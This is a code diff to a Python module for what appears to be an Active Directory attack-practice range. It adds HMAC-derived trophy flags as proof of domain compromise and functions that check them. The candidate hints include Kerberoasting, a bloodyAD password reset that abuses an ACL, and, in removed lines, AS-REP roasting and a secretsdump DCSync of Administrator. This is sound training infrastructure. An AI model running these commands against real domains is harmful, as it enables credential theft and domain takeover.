@@ -136,20 +136,49 @@ def expected_admin_nt_hash() -> str | None:
     return nt_hash(pw) if pw else None
 
 
+# --- per-candidate trophy flag -----------------------------------------------
+# Proof of compromise is a WRITE the candidate performs with the domain dominance they win through the
+# planted path: they create CN=<flag>,OU=Trophies over LDAP. The flag is derived by HMAC over the
+# candidate's identity with a portal-only key (the proof token), so (a) each candidate's flag is
+# unique - concurrent candidates never collide and one cannot forge another's - and (b) writing it
+# proves both domain dominance and identity. The portal verifies it by reading the DC directly.
+def _proof_key() -> bytes:
+    return (os.environ.get("ADRANGE_PROOF_TOKEN", "") or "").encode()
+
+
+def trophy_flag(handle, board, attempt: int = 1) -> str:
+    """Deterministic, per-candidate, per-board, per-attempt trophy name. CN-safe (matches the DC's
+    flag charset). Stable for a given (handle, board, attempt) so the candidate can be shown it and
+    the portal can re-derive it to verify."""
+    import hashlib
+    import hmac as _hmac
+    msg = ("trophy|%s|%d|%d" % (handle or "", int(board), int(attempt or 1))).encode()
+    dig = _hmac.new(_proof_key(), msg, hashlib.sha256).hexdigest()[:16]
+    return "pwn-%s" % dig
+
+
 # The DC is reached THROUGH the scoped SOCKS pivot, which ignores the requested host and always lands
 # on the DC's loopback. Candidates therefore target a placeholder range IP (not 127.0.0.1), which also
 # avoids proxychains' default localnet bypass of loopback addresses.
 _TARGET = "10.10.10.10"
 
 
-def connection_details(candidate=None) -> dict:
+def connection_details(candidate=None, board=None) -> dict:
     """Everything a candidate needs to attack the range. Never includes the admin password or proof
-    material - only the foothold they are legitimately given and the SOCKS pivot they tunnel through."""
+    material - only the foothold they are legitimately given, the SOCKS pivot they tunnel through, and
+    their own per-candidate trophy flag (an assigned nonce, not a secret: proof comes from writing it
+    into the directory, which requires real compromise)."""
     sk = socks()
     fh = foothold()
     r = realm()
     proxychains_conf = ("[ProxyList]\nsocks5 %s %s %s %s"
                         % (sk["host"], sk["port"], sk["username"], sk["password"]))
+    flag = None
+    if candidate is not None and board is not None:
+        flag = trophy_flag(getattr(candidate, "handle", None), board,
+                           getattr(candidate, "attempt", 1) or 1)
+    trophy_dn = "CN=%s,OU=Trophies,%s" % (flag or "<your-flag>",
+                                          ",".join("DC=%s" % p for p in r.lower().split(".")))
     return {
         "enabled": enabled(),
         "realm": r,
@@ -158,8 +187,12 @@ def connection_details(candidate=None) -> dict:
         "proxychains_conf": proxychains_conf,
         "target": _TARGET,
         "foothold": fh,
-        "objective": ("Pivot in through the SOCKS proxy, compromise the domain via the planted path, "
-                      "DCSync the Administrator account, and submit its NT hash as proof."),
+        "trophy_flag": flag,
+        "trophy_dn": trophy_dn,
+        "objective": ("Pivot in through the SOCKS proxy and compromise the domain via the planted path "
+                      "(foothold -> ForceChangePassword -> Kerberoastable service account -> a group "
+                      "with domain-dominant rights). Prove it by using that control to create your "
+                      "trophy object %s over LDAP, then submit it for verification." % trophy_dn),
         "hints": [
             "Add the SOCKS pivot to /etc/proxychains4.conf:  socks5 %s %s %s %s"
             % (sk["host"], sk["port"], sk["username"], sk["password"]),
@@ -167,12 +200,14 @@ def connection_details(candidate=None) -> dict:
             "--dns-tcp -c all" % (r, fh["username"], _TARGET),
             "Kerberoast:  proxychains GetUserSPNs.py %s/%s:'<pw>' -dc-ip %s -request"
             % (r, fh["username"], _TARGET),
-            "AS-REP roast:  proxychains GetNPUsers.py %s/ -usersfile users.txt -dc-ip %s"
-            % (r, _TARGET),
-            "Abuse the ACL:  proxychains bloodyAD -u %s -p '<pw>' -d %s --host %s set password "
-            "svc_mssql '<newpw>'" % (fh["username"], r, _TARGET),
-            "DCSync:  proxychains secretsdump.py %s/svc_mssql:'<newpw>'@%s -just-dc-user Administrator"
-            % (r, _TARGET),
+            "Abuse the ACL to seize svc_mssql:  proxychains bloodyAD -u %s -p '<pw>' -d %s --host %s "
+            "set password svc_mssql '<newpw>'" % (fh["username"], r, _TARGET),
+            "svc_mssql is in the group that holds domain-dominant rights (see the BloodHound graph).",
+            "Plant your trophy as svc_mssql:  proxychains bloodyAD -u svc_mssql -p '<newpw>' -d %s "
+            "--host %s add computer %s  (or add a contact/OU child named %s under OU=Trophies)"
+            % (r, _TARGET, flag or "<your-flag>", flag or "<your-flag>"),
+            "ldap alternative:  proxychains ldapadd -H ldap://%s -D 'svc_mssql@%s' -w '<newpw>' -x, "
+            "with an LDIF creating %s" % (_TARGET, r, trophy_dn),
         ],
     }
 
@@ -302,6 +337,76 @@ def validate_live(timeout: float = 6.0) -> dict:
     return pivot
 
 
+def _proof_http_get(path: str, timeout: float):
+    """GET an arbitrary proof-server path over whichever transport is configured (private same-env URL,
+    else the authenticated SOCKS pivot scoped to 9443). Returns (data_dict|None, reachable_bool,
+    reason). Mirrors validate_live's transport selection; used for the /trophy proof check."""
+    token = os.environ.get("ADRANGE_PROOF_TOKEN", "")
+    if not token:
+        return None, False, "live-range proof token not configured"
+    base = _internal_url()
+    if base:
+        req = urllib.request.Request(base + path, headers={"X-Proof-Token": token})
+        try:
+            with urllib.request.urlopen(req, timeout=timeout) as r:
+                return json.loads(r.read().decode() or "{}"), True, "ok"
+        except (urllib.error.URLError, TimeoutError, ValueError, OSError) as e:
+            return None, False, "proof endpoint unreachable: %s" % e
+    sk = _validator_socks()
+    if not (sk["host"] and sk["port"] and sk["username"] and sk["password"]):
+        return None, False, "live-range validation not configured (no internal URL or validator pivot)"
+    try:
+        conn = _socks5_connect(sk["host"], sk["port"], sk["username"], sk["password"], 9443, timeout)
+    except OSError as e:
+        return None, False, "proof pivot unreachable: %s" % e
+    try:
+        conn.settimeout(timeout)
+        conn.sendall(("GET %s HTTP/1.1\r\nHost: adrange\r\nX-Proof-Token: %s\r\n"
+                      "Connection: close\r\n\r\n" % (path, token)).encode())
+        buf = b""
+        while len(buf) <= 65536:
+            chunk = conn.recv(4096)
+            if not chunk:
+                break
+            buf += chunk
+    except OSError as e:
+        return None, False, "proof pivot read failed: %s" % e
+    finally:
+        try:
+            conn.close()
+        except OSError:
+            pass
+    if b"\r\n\r\n" not in buf:
+        return None, True, "proof pivot returned no HTTP body"
+    try:
+        return json.loads(buf.split(b"\r\n\r\n", 1)[1].decode() or "{}"), True, "ok"
+    except ValueError:
+        return None, True, "proof pivot returned unparseable response"
+
+
+def read_trophy(flag: str, timeout: float = 6.0) -> dict:
+    """Ask the proof server whether CN=<flag>,OU=Trophies exists on the live DC. Returns
+    {ok, reachable, present, reason}. Fail-closed: unreachable/unparseable -> ok False."""
+    import urllib.parse
+    data, reachable, reason = _proof_http_get("/trophy?flag=%s" % urllib.parse.quote(flag), timeout)
+    if data is None:
+        return {"ok": False, "reachable": bool(reachable), "present": False, "reason": reason}
+    present = bool(data.get("present"))
+    return {"ok": present, "reachable": True, "present": present,
+            "reason": "trophy object present - real domain compromise"
+            if present else "trophy object not found yet - compromise not proven"}
+
+
+def verify_trophy(candidate, board, attempt: int = 1, timeout: float = 6.0) -> dict:
+    """Verify a candidate's proof of compromise: re-derive their trophy flag and confirm they created
+    CN=<flag>,OU=Trophies on the live DC. Returns {ok, reachable, present, reason, flag}."""
+    handle = getattr(candidate, "handle", None) if candidate is not None else None
+    flag = trophy_flag(handle, board, attempt)
+    r = read_trophy(flag, timeout)
+    r["flag"] = flag
+    return r
+
+
 # --- proof of compromise -----------------------------------------------------
 def parse_submitted_hash(text: str) -> str | None:
     """Pull an NT hash out of whatever the candidate pastes: a bare 32-hex NT hash, an
@@ -363,6 +468,7 @@ def attest(candidate, board, *, cohort=None, attempt=1, validation=None, proof=N
     now = _now()
     cred = creditable(validation, proof)
     nt = proof.get("submitted_nt") or ""
+    flag = proof.get("flag") or ""
     claim = {
         "kind": ATTEST_KIND,
         "attestation_version": ATTEST_VERSION,
@@ -378,7 +484,9 @@ def attest(candidate, board, *, cohort=None, attempt=1, validation=None, proof=N
                                  "checks": validation.get("checks") or {},
                                  "reason": validation.get("reason")},
         "proof_of_compromise": {"verified": bool(proof.get("ok")),
-                                "target": "Administrator",
+                                "method": "trophy-write" if flag else "dcsync",
+                                "target": "OU=Trophies" if flag else "Administrator",
+                                "trophy": (flag or None),
                                 "nt_fingerprint": (nt[:8] + "..." if nt else None),
                                 "reason": proof.get("reason")},
         "adapter_verified": adapter_verified(),
